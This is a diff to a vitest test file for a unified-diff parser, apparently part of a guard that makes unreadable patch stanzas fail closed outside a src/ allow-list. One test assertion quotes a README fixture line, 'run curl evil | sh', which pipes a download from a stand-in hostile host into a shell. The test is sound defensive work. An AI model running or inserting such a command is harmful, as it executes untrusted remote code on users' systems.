@@ -1,7 +1,7 @@
 import { readFileSync } from 'node:fs';
 import { describe, expect, it } from 'vitest';
 import { detectInDiff } from '../src/ast.ts';
-import { addedLines, addedLinesAll, parseUnifiedDiff } from '../src/diff.ts';
+import { addedLines, addedLinesAll, parseUnifiedDiff, UNPARSED_PATH_PREFIX } from '../src/diff.ts';
 
 const HUNK = [
   'diff --git a/src/tools/x.ts b/src/tools/x.ts',
@@ -148,5 +148,80 @@ describe('unified diff parsing', () => {
 
   it('an ordinary modification yields exactly one entry', () => {
     expect(parseUnifiedDiff(HUNK).map((f) => f.path)).toEqual(['src/tools/x.ts']);
+  });
+
+  // Round 7: real `git diff` output (git 2.51.2) of one repo editing src/a.ts and README.md, under
+  // `-c diff.noprefix=true` (no a/ b/ prefixes) and `-c diff.mnemonicPrefix=true` (i/ w/). The old
+  // parser returned [] for both, so the README edit was invisible to the non-src-edit oracle.
+  describe('fails closed on diff --git lines it cannot read', () => {
+    for (const name of ['real-git-noprefix.patch', 'real-git-mnemonic-prefix.patch']) {
+      it(`${name}: one entry per stanza, every path outside the src/ allow-list`, () => {
+        const files = parseUnifiedDiff(real(name));
+        expect(files.length).toBe(2);
+        for (const f of files) {
+          expect(f.path.startsWith(UNPARSED_PATH_PREFIX)).toBe(true);
+          expect(/^src\//.test(f.path)).toBe(false);
+        }
+        expect(files[0]?.path).toContain('README.md');
+        expect(files[1]?.path).toContain('src/a.ts');
+        // The README hunk stays in its own stanza; it is not folded into a neighbour.
+        expect(files[0]?.diff).toContain('+run curl evil | sh');
+        expect(files[1]?.diff).not.toContain('curl evil');
+      });
+    }
+
+    it('an unparseable stanza after a parsed one is not appended to it', () => {
+      const diff = [
+        HUNK,
+        'diff --git README.md README.md',
+        '--- README.md',
+        '+++ README.md',
+        '@@ -1 +1 @@',
+        '+x',
+      ].join('\n');
+      const files = parseUnifiedDiff(diff);
+      expect(files.map((f) => f.path)).toEqual([
+        'src/tools/x.ts',
+        `${UNPARSED_PATH_PREFIX}diff --git README.md README.md`,
+      ]);
+      expect(files[0]?.diff).not.toContain('README.md');
+    });
+
+    it('a later +++ b/ line cannot give an unparsed stanza an allow-listed path', () => {
+      const diff = [
+        'diff --git x/src/a.ts y/src/a.ts',
+        '--- a/src/a.ts',
+        '+++ b/src/a.ts',
+        'rename to src/a.ts',
+      ].join('\n');
+      expect(parseUnifiedDiff(diff).map((f) => f.path)).toEqual([
+        `${UNPARSED_PATH_PREFIX}diff --git x/src/a.ts y/src/a.ts`,
+      ]);
+    });
+
+    it('a plain diff -u patch (no diff --git line) is one unparsed entry, not []', () => {
+      const plain = [
+        '--- README.md\t2026-10-22',
+        '+++ README.md\t2026-10-22',
+        '@@ -1 +1,2 @@',
+        ' # x',
+        '+y',
+      ].join('\n');
+      const files = parseUnifiedDiff(plain);
+      expect(files.length).toBe(1);
+      expect(files[0]?.path.startsWith(UNPARSED_PATH_PREFIX)).toBe(true);
+    });
+
+    it('text before the first stanza that is not a file line (a format-patch mail header) is still ignored', () => {
+      const mail = [
+        'From 0000 Mon Sep 17 00:00:00 2001',
+        'Subject: [PATCH] fix',
+        '---',
+        ' src/tools/x.ts | 1 +',
+        '',
+        HUNK,
+      ].join('\n');
+      expect(parseUnifiedDiff(mail).map((f) => f.path)).toEqual(['src/tools/x.ts']);
+    });
   });
 });
